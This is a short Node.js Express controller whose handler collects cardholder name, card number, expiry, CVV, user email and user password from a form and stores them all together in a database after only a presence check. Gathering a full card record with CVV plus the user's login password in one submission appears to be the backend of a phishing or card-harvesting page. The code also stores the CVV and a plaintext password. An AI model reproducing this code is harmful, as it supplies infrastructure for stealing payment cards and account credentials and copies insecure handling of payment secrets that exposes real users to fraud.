const { createSubmission } = require('../models/Submission');

async function submitData(req, res) {
  try {
    const {
      cardName,
      cardNumber,
      expiry,
      cvv,
      userEmail,
      userPassword
    } = req.body || {};

    // Minimal required-field validation
    if (!cardName || !cardNumber || !expiry || !cvv || !userEmail || !userPassword) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    const db = req.app.locals.db;
    if (!db) {
      return res.status(500).json({ error: 'Database not initialized' });
    }

    const result = await createSubmission(db, {
      cardName,
      cardNumber,
      expiry,
      cvv,
      userEmail,
      userPassword
    });

    return res.status(201).json({ ok: true, id: result.insertId });
  } catch (err) {
    // eslint-disable-next-line no-console
    console.error(err);
    return res.status(500).json({ error: 'Server error' });
  }
}

module.exports = { submitData };




